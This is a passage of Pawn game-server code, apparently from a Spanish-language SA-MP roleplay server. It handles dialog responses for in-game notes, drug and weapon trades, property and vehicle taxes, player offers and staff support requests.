				        	Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cNote3]);
						}
						else
						{
	    					strmid(cuenta[playerid][cNote3], "None", 0, strlen("None"), 80);
       						Mensaje(playerid, COLOR_GRIS2, "Nota 3 borrada.");
						}
			   		}
				    case 3:
			    	{
				        if(TEL_INPUT_ID[playerid] == 5)
			    	    {
			        		ClearChatbox(playerid, 10);
				        	Mensaje(playerid, COLOR_ROJO, "iPhone ======= Nota 4 =======================================================");
				        	Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cNote4]);
						}
						else
						{
	    					strmid(cuenta[playerid][cNote4], "None", 0, strlen("None"), 80);
       						Mensaje(playerid, COLOR_GRIS2, "Nota 4 borrada.");
						}
		    		}
				    case 4:
			    	{
				        if(TEL_INPUT_ID[playerid] == 5)
			    	    {
			        		ClearChatbox(playerid, 10);
				        	Mensaje(playerid, COLOR_ROJO, "iPhone ======= Nota 5 =======================================================");
				        	Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cNote5]);
						}
						else
						{
	    					strmid(cuenta[playerid][cNote5], "None", 0, strlen("None"), 80);
       						Mensaje(playerid, COLOR_GRIS2, "Nota 5 borrada.");
						}
	    			}
				}
			}
		}


		case DRUGS_DIALOG:
		{
		    if(response)
		    {
	    	    if(strval(inputtext) > obtenerDinero(playerid))return Mensaje(playerid, COLOR_GRIS2, "No tienes esa cantidad!");
	        	new drug[12];
	        	switch(NarcoSellArm[playerid]){
		            case 1:		drug = "Speed";
		            case 2:		drug = "Extasis";
	    	        case 3:		drug = "Ritalin";
	        	    case 4:		drug = "Heroina";
	            	case 5:		drug = "Marihuana";
	            	case 6:     drug = "dvirgen";
         		}
		        NarcoSellPrice[playerid] = strval(inputtext);
		        BuyNarco[BuyNarco[playerid]] = playerid;
	    	    format(string, sizeof(string), "\tDEMANDA DE DROGAS (%s)\t\n Drogas: %d - Tipo: %s - Precio: %d$", PlayerName(playerid), NarcoSellAmmo[playerid], drug, NarcoSellPrice[playerid]);
	        	ShowPlayerDialog(BuyNarco[playerid], CONFIRM_DRUGS_DIALOG, DIALOG_STYLE_MSGBOX, "Comprar drogas", string, "Aceptar", "Cancelar");
	    	}
		}
		case CONFIRM_DRUGS_DIALOG:
		{
		    if(response)
			{
			    if(NarcoSellPrice[BuyNarco[playerid]] > obtenerDinero(BuyNarco[playerid]))return Mensaje(playerid, COLOR_GRIS2, "No tiene esa cantidad!");

				new drug[12];
				switch(NarcoSellArm[BuyNarco[playerid]]){
				    case 1:		drug = "Speed";
				    case 2:		drug = "Extasis";
			    	case 3:		drug = "Ritalin";
			  	  	case 4:		drug = "Heroina";
			    	case 5:		drug = "Marihuana";
   				}
				format(string, sizeof(string), "* %s compró a %s %d gramos de %s por %d$", PlayerName(BuyNarco[playerid]), PlayerName(playerid), NarcoSellAmmo[BuyNarco[playerid]], drug, NarcoSellPrice[BuyNarco[playerid]]);
				Mensaje(playerid, COLOR_BLANCO, string);
				Mensaje(BuyNarco[playerid], COLOR_BLANCO, string);

				pierdeDinero(BuyNarco[playerid], NarcoSellPrice[BuyNarco[playerid]]);
				ganaDinero(playerid, NarcoSellPrice[BuyNarco[playerid]]);

				switch(NarcoSellArm[BuyNarco[playerid]]){
				    case 1:	{cuenta[BuyNarco[playerid]][cSpeed] += NarcoSellAmmo[BuyNarco[playerid]]; cuenta[playerid][cSpeed] -= NarcoSellAmmo[BuyNarco[playerid]];}
				    case 2:	{cuenta[BuyNarco[playerid]][cExtasis] += NarcoSellAmmo[BuyNarco[playerid]]; cuenta[playerid][cExtasis] -= NarcoSellAmmo[BuyNarco[playerid]];}
				    case 3:	{cuenta[BuyNarco[playerid]][cRitalin] += NarcoSellAmmo[BuyNarco[playerid]]; cuenta[playerid][cRitalin] -= NarcoSellAmmo[BuyNarco[playerid]];}
			    	case 4:	{cuenta[BuyNarco[playerid]][cHeroina] += NarcoSellAmmo[BuyNarco[playerid]]; cuenta[playerid][cHeroina] -= NarcoSellAmmo[BuyNarco[playerid]];}
			    	case 5:	{cuenta[BuyNarco[playerid]][cMarihuana] += NarcoSellAmmo[BuyNarco[playerid]]; cuenta[playerid][cMarihuana] -= NarcoSellAmmo[BuyNarco[playerid]];}
				}
				BuyNarco[playerid] = 0;
				BuyNarco[BuyNarco[playerid]] = 0;

				NarcoSellPrice[playerid] = 0;
				NarcoSellPrice[BuyNarco[playerid]] = 0;

				NarcoSellArm[playerid] = 0;
				NarcoSellArm[BuyNarco[playerid]] = 0;

				NarcoSellAmmo[playerid] = 0;
				NarcoSellAmmo[BuyNarco[playerid]] = 0;
	    	}
		}
		case DIALOG_HIT:
		{
	 	    if(response)
 		    {
 	    	    if(strval(inputtext) < 1 || strval(inputtext) > 299)return Mensaje(playerid, COLOR_GRIS2, "ERROR! Skin de 1 a 299");
            	if(verificarDinero(playerid, 200))
				{
	                cuenta[playerid][cTraje] = strval(inputtext);
    	            SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
			    }
		    	return 1;
	    	}
		}
		case DIALOGO_IMPUESTO_CASAS:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
				new casaid, tiempo, tiempo2, pagarIa;
				switch(listitem)
				{
					case 0:
					{
						casaid = cuenta[playerid][cCasa];
						if(casaid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee una casa.");
						tiempo = casa[casaid][hTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						pagarIa = casa[casaid][hValue] * 3 / 100;

						if(tiempo2 > 6)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu casa le queden de 1 a 6 dias");
						if(obtenerDinero(playerid) < pagarIa)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente dinero para pagar el impuesto.");
						casa[casaid][hTime] = gettime() + 2160000;

						//ZZCASH
						switch(cuenta[playerid][cDonador])
						{
							case 1: pierdeDinero(playerid, pagarIa - pagarIa * 1  / 100);
							case 2: pierdeDinero(playerid, pagarIa - pagarIa * 2  / 100);
							case 3: pierdeDinero(playerid, pagarIa - pagarIa * 3  / 100);
							case 4: pierdeDinero(playerid, pagarIa - pagarIa * 10 / 100);
							default: pierdeDinero(playerid, pagarIa);
						}
						Mensaje(playerid, COLOR_VERDE, "Usted acaba de pagar sus impuestos por su casa.");
					}
					case 1:
					{
						casaid = cuenta[playerid][cCasa2];
						if(casaid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee una casa.");
						tiempo = casa[casaid][hTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						pagarIa = casa[casaid][hValue] * 3 / 100;

						if(tiempo2 > 6)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu casa le queden de 1 a 6 dias");
						if(obtenerDinero(playerid) < pagarIa)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente dinero para pagar el impuesto.");
						casa[casaid][hTime] = gettime() + 2160000;

						//ZZCASH
						switch(cuenta[playerid][cDonador])
						{
							case 1: pierdeDinero(playerid, pagarIa - pagarIa * 1  / 100);
							case 2: pierdeDinero(playerid, pagarIa - pagarIa * 2  / 100);
							case 3: pierdeDinero(playerid, pagarIa - pagarIa * 3  / 100);
							case 4: pierdeDinero(playerid, pagarIa - pagarIa * 10 / 100);
							default: pierdeDinero(playerid, pagarIa);
						}
						Mensaje(playerid, COLOR_VERDE, "Usted acaba de pagar sus impuestos por su casa.");
					}
				}
			}
		}
		case DIALOGO_IMPUESTO_NEGOCIOS:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
				new negid, tiempo, tiempo2, pagarIa;
				switch(listitem)
				{
					case 0:
					{
						negid = cuenta[playerid][cNegocio];
						if(negid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un negocio.");
						tiempo = negocio[negid][bTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						pagarIa = negocio[negid][bBuyPrice] * 3 / 100;

						if(tiempo2 > 6)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu negocio le queden de 1 a 6 dias");
						if(obtenerDinero(playerid) < pagarIa)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente dinero para pagar el impuesto.");
						negocio[negid][bTime] = gettime() + 2160000;

						//ZZCASH
						switch(cuenta[playerid][cDonador])
						{
							case 1: pierdeDinero(playerid, pagarIa - pagarIa * 1  / 100);
							case 2: pierdeDinero(playerid, pagarIa - pagarIa * 2  / 100);
							case 3: pierdeDinero(playerid, pagarIa - pagarIa * 3  / 100);
							case 4: pierdeDinero(playerid, pagarIa - pagarIa * 10 / 100);
							default: pierdeDinero(playerid, pagarIa);
						}
						Mensaje(playerid, COLOR_VERDE, "Usted acaba de pagar sus impuestos por el negocio.");
					}
					case 1:
					{
						negid = cuenta[playerid][cNegocio2];
						if(negid == 9999)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un negocio.");
						tiempo = negocio[negid][bTime] - gettime();
						tiempo2 = ((tiempo / 60) / 60) / 24;
						pagarIa = negocio[negid][bBuyPrice] * 3 / 100;

						if(tiempo2 > 6)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu negocio le queden de 1 a 6 dias");
						if(obtenerDinero(playerid) < pagarIa)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente dinero para pagar el impuesto.");
						negocio[negid][bTime] = gettime() + 2160000;

						//ZZCASH
						switch(cuenta[playerid][cDonador])
						{
							case 1: pierdeDinero(playerid, pagarIa - pagarIa * 1  / 100);
							case 2: pierdeDinero(playerid, pagarIa - pagarIa * 2  / 100);
							case 3: pierdeDinero(playerid, pagarIa - pagarIa * 3  / 100);
							case 4: pierdeDinero(playerid, pagarIa - pagarIa * 10 / 100);
							default: pierdeDinero(playerid, pagarIa);
						}
						Mensaje(playerid, COLOR_VERDE, "Usted acaba de pagar sus impuestos por el negocio.");
					}
				}
			}
		}
		case DIALOGO_IMPUESTO_AUTOS:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
				new vehicle, tiempo, tiempo2, pagarIa;
				switch(listitem)
				{
					case 0: vehicle = cuenta[playerid][cCoche];
					case 1: vehicle = cuenta[playerid][cCoche2];
					case 2: vehicle = cuenta[playerid][cCoche3];
					case 3: vehicle = cuenta[playerid][cCoche4];
				}
				if(!vehicle)return Mensaje(playerid, COLOR_ROJO, "Usted no posee un vehiculo en este slot.");
				
				pagarIa = autos[vehicle][cValue] * 3 / 100;
				if(obtenerDinero(playerid) < pagarIa)return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente dinero para pagar el impuesto.");
				
				tiempo = autos[vehicle][cVehTime] - gettime();
				tiempo2 = ((tiempo / 60) / 60) / 24;
				if(tiempo2 > 6)return Mensaje(playerid, COLOR_ROJO, "Paga cuando a tu vehiculo le queden de 1 a 6 dias");
				
				autos[vehicle][cVehTime] = gettime() + 2160000;
				
				//ZZCASH
				switch(cuenta[playerid][cDonador])
				{
					case 1: pierdeDinero(playerid, pagarIa - pagarIa * 1  / 100);
					case 2: pierdeDinero(playerid, pagarIa - pagarIa * 2  / 100);
					case 3: pierdeDinero(playerid, pagarIa - pagarIa * 3  / 100);
					case 4: pierdeDinero(playerid, pagarIa - pagarIa * 10 / 100);
					default: pierdeDinero(playerid, pagarIa);
				}
				
				format(string, sizeof(string), "Usted pago %d$ por %s, ahora su vehiculo esta seguro.", pagarIa, generarTiempo(autos[vehicle][cVehTime] - gettime()));
				Mensaje(playerid, COLOR_VERDE, string);
			}
		}
		case BRILLO_GAFAS:
		{
		    if(response)
	        {
                if(!strcmp(inputtext, "Luminoso", true))
                {
                        TextDrawHideForPlayer(playerid, SunGlasses);
                        TextDrawBoxColor(SunGlasses, 0x00000025);
                        TextDrawShowForPlayer(playerid, SunGlasses);
                }
                if(!strcmp(inputtext, "Normal", true))
                {
                        TextDrawHideForPlayer(playerid, SunGlasses);
                        TextDrawBoxColor(SunGlasses, 0x00000040);
                        TextDrawShowForPlayer(playerid, SunGlasses);
                }
                if(!strcmp(inputtext, "Oscuro", true))
                {
                        TextDrawHideForPlayer(playerid, SunGlasses);
                        TextDrawBoxColor(SunGlasses, 0x00000055);
                        TextDrawShowForPlayer(playerid, SunGlasses);
                }
                if(!strcmp(inputtext, "MuyOscuro", true))
                {
                        TextDrawHideForPlayer(playerid, SunGlasses);
                        TextDrawBoxColor(SunGlasses, 0x00000065);
                        TextDrawShowForPlayer(playerid, SunGlasses);
                }
         	}
		}
		case IPHONE_AGENDA_ESCRIVIR:
		{
	 		if(response)
			{
	     			if(strcmp(cuenta[playerid][cNote1], "None", true) == 0)
					{
						strmid(cuenta[playerid][cNote1], inputtext, 0, strlen(inputtext), 80);
	    				format(string, sizeof(string), "Nota1: %s", cuenta[playerid][cNote1]);
					    Mensaje(playerid, COLOR_GRIS2, string);
					}
			}
		return 0;
		}
		case DIALOGO_PETICIONES:
		{
			if(response)
			{
				format(string, sizeof(string), "* %s acepta una petición.", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				
				switch(peticiones[playerid])
				{
					case 1:
					{
						format(string, sizeof(string), "* %s aceptó tu entrevista", PlayerName(playerid));
						Mensaje(LiveOffer[playerid], 0x00FFFFFF, string);
						format(string, sizeof(string), "* Aceptaste la entrevista de %s", PlayerName(LiveOffer[playerid]));
						Mensaje(playerid, 0x00FFFFFF, string);
						Mensaje(playerid, COLOR_AMARILLO2, "* Utiliza (/c) para hablar fuera de antena. Y (/centrevista) para salir de la entrevista.");
						Mensaje(LiveOffer[playerid], COLOR_AMARILLO2, "* Utiliza (/c) para hablar fuera de antena. Y (/centrevista) para cancelar la entrevista.");
						booleano[TalkingLive]{playerid} = true;
						booleano[TalkingLive]{LiveOffer[playerid]} = true;
						booleano[Facturing]{playerid} = false;
						peticiones[playerid] = 0;
					}
					case 2:
					{
						if(verificarDinero(playerid, NarcoSellPrice[playerid]))
						{
							new gunname[12];
							GetWeaponName(NarcoSellArm[playerid], gunname, sizeof(gunname));
							format(string, sizeof(string), "* %s compra a %s una %s con %d balas por %d", PlayerName(playerid), PlayerName(BuyNarco[playerid]), gunname, NarcoSellAmmo[playerid], NarcoSellPrice[playerid]);
							Mensaje(playerid, COLOR_BLANCO, string);
							Mensaje(BuyNarco[playerid], COLOR_BLANCO, string);
							darArma(playerid, NarcoSellArm[playerid], NarcoSellAmmo[playerid]);
							darArma(BuyNarco[playerid], NarcoSellArm[playerid], -NarcoSellAmmo[playerid]);
							pierdeDinero(playerid, NarcoSellPrice[playerid]);
							ganaDinero(BuyNarco[playerid], NarcoSellPrice[playerid]);
							booleano[Facturing]{playerid} = false;
							peticiones[playerid] = 0;
							BuyNarco[playerid] = 999;
							NarcoSellPrice[playerid] = 0;
							NarcoSellArm[playerid] = 0;
							NarcoSellAmmo[playerid] = 0;
							return 1;
						}
						else
						{
							Mensaje(playerid, COLOR_GRIS2, "No tienes dinero suficiente!");
							Mensaje(BuyNarco[playerid], COLOR_GRIS2, "El comprador no tiene suficiente dinero!");
							BuyNarco[playerid] = 999;
							NarcoSellPrice[playerid] = 0;
							NarcoSellArm[playerid] = 0;
							NarcoSellAmmo[playerid] = 0;
							booleano[Facturing]{playerid} = false;
							peticiones[playerid] = 0;
							return 1;
						}
					}
					case 3:
					{
						if(!cuenta[playerid][cCoche])
						{
							cuenta[playerid][cCoche] = peticionIDItem[playerid];
							ComprarUsuarioVehiculo(playerid);
						}
						else if(!cuenta[playerid][cCoche2])
						{
							cuenta[playerid][cCoche2] = peticionIDItem[playerid];
							ComprarUsuarioVehiculo(playerid);
						}
						else if(!cuenta[playerid][cCoche3] && cuenta[playerid][cDonador] >= 3)
						{
							cuenta[playerid][cCoche3] = peticionIDItem[playerid];
							ComprarUsuarioVehiculo(playerid);
						}
						else if(!cuenta[playerid][cCoche4] && cuenta[playerid][cDonador] >= 4)
						{
							cuenta[playerid][cCoche4] = peticionIDItem[playerid];
							ComprarUsuarioVehiculo(playerid);
						}
						else
						{
							format(string, sizeof(string), "* %s rechazó comprarte el vehículo, no tiene slots disponibles.", PlayerName(playerid));
							Mensaje(peticionIDofertante[playerid], COLOR_ROJO, string);
							peticiones[playerid] = 0;
							peticionSlotItem[playerid] = 0;
							booleano[Facturing]{playerid} = false;
							peticionIDofertante[playerid] = 999;
							peticionIDItem[playerid] = 999;
							peticionPrecio[playerid] = 0;
						}
					}
					case 4:
					{
						if(obtenerDinero(playerid) >= peticionPrecio[playerid])
						{
							pierdeDinero(playerid, peticionPrecio[playerid]);
							ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);
							new vehicle = GetPlayerVehicleID(peticionIDofertante[playerid]), rand = 2 + random(2);
							PutPlayerInVehicleEx(playerid, vehicle, rand);
							Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, "Lleva a tu cliente a su destino.");
							
							peticiones[playerid] = 0;
							booleano[Facturing]{playerid} = false;
							peticionIDofertante[playerid] = 999;
							peticionIDItem[playerid] = 999;
							peticionPrecio[playerid] = 0;
						}
						else
						{
							Mensaje(playerid, COLOR_ROJO, "No tienes dinero para pagar esta tarifa.");
							Mensaje(peticionIDofertante[playerid], COLOR_ROJO, "Este cliente no tiene suficiente dinero.");
							peticiones[playerid] = 0;
							booleano[Facturing]{playerid} = false;
							peticionIDofertante[playerid] = 999;
							peticionIDItem[playerid] = 999;
							peticionPrecio[playerid] = 0;
						}
					}
					case 5:
					{
						Mensaje(playerid, COLOR_BLANCO, "Bienvenido a esta familia.");
						cuenta[playerid][cFamilia] = cuenta[peticionIDofertante[playerid]][cFamilia];
						cuenta[playerid][cFamiliaRango] = 1;

						new Consulta[126];
						mysql_format(servidor[mysqlControl], Consulta, sizeof(Consulta), "UPDATE zz_usuarios SET fam=%d, famr=%d WHERE id = %d;", cuenta[playerid][cFamilia], cuenta[playerid][cFamiliaRango], cuenta[playerid][cUnico]);
						mysql_query(servidor[mysqlControl], Consulta, false);

						peticiones[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
					case 6:
					{
						format(string, sizeof(string), "Golpea bruscamente y roba a %s", PlayerName(playerid));
						AccionMe(peticionIDofertante[playerid], string);						
						format(string, sizeof(string), "%d$", peticionPrecio[playerid]);
						AccionDo(peticionIDofertante[playerid], string);

						Mensaje(peticionIDofertante[playerid], COLOR_GRIS2, "Usted ha recibido +1 nivel de busqueda por el robo realizado.");
						
						SetHP(playerid, 20.0);
						
						cuenta[peticionIDofertante[playerid]][cRobo] = gettime() + 300;
						cuenta[peticionIDofertante[playerid]][cBusqueda]++;
						ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);
						pierdeDinero(playerid, peticionPrecio[playerid]);
						
						peticiones[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
					case 7:
					{
						if(cuenta[playerid][cNegocio] == 9999)
						{
							cuenta[playerid][cNegocio] = peticionIDItem[playerid];
							
							Mensaje(playerid, COLOR_BLANCO, "Felicidades! Tienes nuevo negocio, utiliza /cuenta o /ayuda");
							Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, "Has vendido tu Negocio!");

							pierdeDinero(playerid, peticionPrecio[playerid]);
							ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);
							
							format(negocio[peticionIDItem[playerid]][bOwner], 24, "%s", Nombre(playerid));
							ActualizaNegocio(peticionIDItem[playerid]);
							OnBizzTextdrawUpdate(peticionIDItem[playerid]);
							
							if(peticionSlotItem[playerid] == 1)
							{
								cuenta[peticionIDofertante[playerid]][cNegocio] = 9999;
							}
							else
							{
								cuenta[peticionIDofertante[playerid]][cNegocio2] = 9999;
							}
						}
						else if(cuenta[playerid][cNegocio2] == 9999 && cuenta[playerid][cDonador] >= 4)
						{
							cuenta[playerid][cNegocio2] = peticionIDItem[playerid];
							
							Mensaje(playerid, COLOR_BLANCO, "Felicidades! Tienes nuevo negocio, utiliza /cuenta o /ayuda");
							Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, "Has vendido tu Negocio!");

							pierdeDinero(playerid, peticionPrecio[playerid]);
							ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);
							
							format(negocio[peticionIDItem[playerid]][bOwner], 24, "%s", Nombre(playerid));
							ActualizaNegocio(peticionIDItem[playerid]);
							OnBizzTextdrawUpdate(peticionIDItem[playerid]);
	
							if(peticionSlotItem[playerid] == 1)
							{
								cuenta[peticionIDofertante[playerid]][cNegocio] = 9999;
							}
							else
							{
								cuenta[peticionIDofertante[playerid]][cNegocio2] = 9999;
							}
						}
						else
						{
							format(string, sizeof(string), "* %s rechazó comprarte el negocio, no tiene slots disponibles.", PlayerName(playerid));
							Mensaje(peticionIDofertante[playerid], COLOR_ROJO, string);
						}
						
						peticiones[playerid] = 0;
						peticionSlotItem[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}					
					case 8:
					{
						if(cuenta[playerid][cCasa] == 9999)
						{
							cuenta[playerid][cCasa] = peticionIDItem[playerid];
							
							Mensaje(playerid, COLOR_BLANCO, "Felicidades! Tienes una nueva propiedad, utiliza /cuenta o /ayuda");
							Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, "Has vendido tu propiedad!");

							pierdeDinero(playerid, peticionPrecio[playerid]);
							ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);
							
							format(casa[peticionIDItem[playerid]][hOwner], 24, "%s", PlayerName(playerid));
							ActualizaCasa(peticionIDItem[playerid]);
							OnPropTextdrawUpdate(peticionIDItem[playerid]);
							
							if(peticionSlotItem[playerid] == 1)
							{
								cuenta[peticionIDofertante[playerid]][cCasa] = 9999;
							}
							else
							{
								cuenta[peticionIDofertante[playerid]][cCasa2] = 9999;
							}
						}
						else if(cuenta[playerid][cCasa2] == 9999 && cuenta[playerid][cDonador] >= 3)
						{
							cuenta[playerid][cCasa2] = peticionIDItem[playerid];
							
							Mensaje(playerid, COLOR_BLANCO, "Felicidades! Tienes una nueva propiedad, utiliza /cuenta o /ayuda");
							Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, "Has vendido tu propiedad!");

							pierdeDinero(playerid, peticionPrecio[playerid]);
							ganaDinero(peticionIDofertante[playerid], peticionPrecio[playerid]);
							
							format(casa[peticionIDItem[playerid]][hOwner], 24, "%s", PlayerName(playerid));
							ActualizaCasa(peticionIDItem[playerid]);
							OnPropTextdrawUpdate(peticionIDItem[playerid]);
	
							if(peticionSlotItem[playerid] == 1)
							{
								cuenta[peticionIDofertante[playerid]][cCasa] = 9999;
							}
							else
							{
								cuenta[peticionIDofertante[playerid]][cCasa2] = 9999;
							}
						}
						else
						{
							format(string, sizeof(string), "* %s rechazó comprarte el negocio, no tiene slots disponibles.", PlayerName(playerid));
							Mensaje(peticionIDofertante[playerid], COLOR_ROJO, string);
						}
						
						peticiones[playerid] = 0;
						peticionSlotItem[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
				}
			}
			else
			{
				format(string, sizeof(string), "* %s rechaza una petición.", PlayerName(playerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
				switch(peticiones[playerid])
				{
					case 1:
					{
						format(string, sizeof(string), "* %s rechazó tu entrevista. Utiliza (/centrevista) para terminar la entrevista.", PlayerName(playerid));
						Mensaje(LiveOffer[playerid], 0x00FFFFFF, string);
						format(string, sizeof(string), "* Rechazaste la entrevista de %s", PlayerName(LiveOffer[playerid]));
						Mensaje(playerid, 0x00FFFFFF, string);
						booleano[Facturing]{playerid} = false;
						peticiones[playerid] = 0;
					}
					case 2:
					{
						format(string, sizeof(string), "* %s rechazó comprarte el arma.", PlayerName(playerid));
						Mensaje(BuyNarco[playerid], COLOR_BLANCO, string);
						BuyNarco[playerid] = 999;
						NarcoSellPrice[playerid] = 0;
						NarcoSellArm[playerid] = 0;
						NarcoSellAmmo[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticiones[playerid] = 0;
					}
					case 3:
					{
						format(string, sizeof(string), "* %s rechazó comprarte el vehículo.", PlayerName(playerid));
						Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, string);
						peticiones[playerid] = 0;
						peticionSlotItem[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
					case 4:
					{						
						format(string, sizeof(string), "* %s rechazó la tarifa.", PlayerName(playerid));
						Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, string);
						peticiones[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
					case 5:
					{
						format(string, sizeof(string), "* %s rechazó unirse a tu familia.", PlayerName(playerid));
						Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, string);
						peticiones[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
					case 6:
					{
						format(string, sizeof(string), "%s rechazó el robo de %s [Posible Mal ROL].", PlayerName(playerid), PlayerName(peticionIDofertante[playerid]));
						MensajeAdmin(COLOR_ROJO2, string, 1);
						
						format(string, sizeof(string), "* %s rechazó el robo.", PlayerName(playerid));
						Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, string);
						
						peticiones[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}					
					case 7:
					{
						format(string, sizeof(string), "* %s rechazó comprarte el negocio.", PlayerName(playerid));
						Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, string);
						peticiones[playerid] = 0;
						peticionSlotItem[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}			
					case 8:
					{
						format(string, sizeof(string), "* %s rechazó comprarte la propiedad.", PlayerName(playerid));
						Mensaje(peticionIDofertante[playerid], COLOR_BLANCO, string);
						peticiones[playerid] = 0;
						peticionSlotItem[playerid] = 0;
						booleano[Facturing]{playerid} = false;
						peticionIDofertante[playerid] = 999;
						peticionIDItem[playerid] = 999;
						peticionPrecio[playerid] = 0;
					}
				}
			}
		}
		case DIALOG_SO:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0:
	            	{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Ayudante.", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un Ayudante le dará soporte");
					}
					case 1:
					{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Moderador.", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un moderador le dará soporte");
					}
					case 2:
					{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Administrador.", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un Administrador le dará soporte");
					}
					case 3:
					{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Administrador General/Encargado de Facciones [2012].", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un Administrador General/Encargado de Facciones le dará soporte.");
					}
					case 4:
					{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Administrador Dueño/Encargado de Staff [2013].", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un Administrador Dueño/Encargado de Staff le dará soporte");
					}
					case 5:
					{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Scripter/Mapper [2014].", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un Scripter/Mapper le dará soporte.");
					}
					case 6:
					{
	                    format(string, sizeof(string), "Atención: %s [%d] ha solicitado a un Dueño [2014].", PlayerName(playerid), playerid);
	                    MensajeAdmin(0xEBBDA3FF, string, 1);
	                    booleano[PlayerSol]{playerid} = true;
	                    Mensaje(playerid, -1, "{1AFF2A}ZZ-RP{FFFFFF}: En breve un Dueño le dará soporte.");
					}
				}
			}
		}
		case PW_ADMIN:
		{
			format(cuenta[playerid][cAcceso2], 24, "%s", inputtext);
			MySQL_UPDATE_STRING("zz_usuarios", Nombre(playerid), "clave2", inputtext);
